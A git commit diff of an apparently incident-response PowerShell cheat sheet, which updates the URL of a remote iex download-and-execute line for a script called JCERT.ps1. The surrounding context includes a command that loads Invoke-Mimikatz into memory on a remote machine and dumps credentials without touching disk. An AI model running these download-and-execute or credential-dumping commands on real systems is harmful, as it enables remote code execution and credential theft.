e8325e7a20b0b602440a2f4ba734336b02ecb255
Jimmi <b1nary0mega@users.noreply.github.com>
2019-09-19 13:36:05 -0400

    Update powershell.ps1
    added command for pulling JCERT from RAW file output

--- powershell.ps1
+++ powershell.ps1
@@ -16,7 +16,7 @@ PS > Get-Command | Where {$_.Name -like "*write*"}
 PS > Get-ChildItem -Path .\ | Rename-Item -NewName {$_.Basename.Replace("old_name","new_name") + $_.extension} -WhatIf -Verbose
 
 # download and execute JCERT.PS1
-PS > Invoke-Command MACHINE_NAME {iex((New-Object Net.WebClient).DownloadString('https://github.com/b1nary0mega/incident-response/raw/master/JCERT.ps1')); JCERT.ps1}
+PS > Invoke-Command MACHINE_NAME {iex((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/b1nary0mega/incident-response/master/JCERT.ps1')); JCERT.ps1}
 
 # ***CAUTION*** load mimikatz into memory; completely bypassing binary on disk
 PS > Invoke-Command MACHINE_NAME {iex((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')); Invoke-Mimikatz -DumpCreds}
